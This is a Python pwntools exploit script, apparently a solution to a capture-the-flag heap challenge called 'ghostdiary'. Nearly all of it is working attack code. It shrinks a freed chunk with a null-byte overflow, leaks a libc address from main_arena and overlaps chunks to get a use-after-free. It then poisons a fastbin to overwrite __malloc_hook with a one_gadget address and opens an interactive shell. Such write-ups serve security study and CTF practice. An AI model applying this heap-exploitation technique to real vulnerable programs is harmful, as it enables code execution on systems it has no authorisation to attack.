from pwn import *
import re

p = process('./ghostdiary')
e = ELF('./libc.so.6')

def at(val):
    return p.recvuntil(val)

def create(size):
    size = int(size)
    p.sendline('1')
    at('>')
    if size <= 240:
        p.sendline('1')
    else:
        p.sendline('2')
    at(':')
    p.sendline(str(size))
    print at('>')

def write(page, content):
    p.sendline('2')
    at(':')
    p.sendline(str(page))
    at(':')
    p.sendline(content)
    print at('>')

def read(page):
    p.sendline('3')
    at(':')
    p.sendline(str(page))
    return at('>')

def delete(page):
    p.sendline('4')
    at(':')
    p.sendline(str(page))
    print at('>')

# gdb.attach(p)
# chunk size ends in 8 so chunks write into prev_size area of next chunk after 16-byte alignment
size = 0x118

create(size)
create(size)
create(size)
create(size)
create(size)
create(size)
create(size)

filler = 0x80
create(filler) #7
create(filler)
create(filler)
create(filler)
create(filler)
create(filler)
create(filler) #13

# next 3 chunks are a, b, and c
create(size) #14
create(size) #15
create(size) #16
create(size) #17


delete(0)
delete(1)
delete(2)
delete(3)
delete(4)
delete(5)
delete(6)

delete(7)
delete(8)
delete(9)
delete(10)
delete(11)
delete(12)
delete(13)



# chunk shrink exploit starts here
# -----------------------------------------

# b will have size written down to 0x100 later.
# Since [chunk+chunk.size] points at next_chunk.data,
# fake chunk header is written to [b+b.fake_size-0x10]
write(15, 'B'*0xf0 + p64(0x100) + p64(0x20)) # fake chunk
delete(15) # free b

# overwrite freed b size lowest byte to 0 using a, b size is now 0x100
write(14, 'A'*size)


# allocate small chunk b1 on b
raw_input("nonono")
create(0x80) #0
create(0x80)
create(0x80)
create(0x80)
create(0x80)
create(0x80)
create(0x80)
create(0x80) #7
raw_input("nonono")
create(0x60) #8 # fastbin b2 made from remaining 0x50 chunk
print bytes(read(7))
raw_input("nonono")

libc_output = read(7) # need to parse and get address for malloc_hook

main_arena_offset = 0x3ebc40
main_arena_336 = re.search(' Content: (.*)', libc_output).group(1)

main_arena_336 = u64(main_arena_336.ljust(8,'\x00'))
print(main_arena_336)

libc_start = main_arena_336 - main_arena_offset - 336
one_gadget = libc_start + 0x10a38c
malloc_hook = libc_start + e.symbols['__malloc_hook'] - 0x13
raw_input("nonono")
delete(0)
delete(1)
delete(2)
delete(3)
delete(4)
delete(5)
delete(6)
delete(7) # this is in unsorted bin, but if it was tcache then it would cause a sigabrt
raw_input("nonono")
delete(16) # c is freed

# c attempts to coalesce with chunk at [c - 0x120] which is b1
# memory from b1 to c is made into a free chunk but we still have access to b2
raw_input("nonono")

# use after free starts here
# TODO
create(0x90) #0
create(0x60) #1
delete(1)
print read(8)
raw_input("nonono")
write(8, '\x00'*8 + p64(0x70) + p64(malloc_hook)) # this overwrites the header of a free fastbin
raw_input("nonono")

create(0x60) # 1
create(0x60) # 2 # this one is malloc_hook - 0x23

write(2, 'W'*0x13 + p64(one_gadget))
raw_input("nonono")
p.interactive()
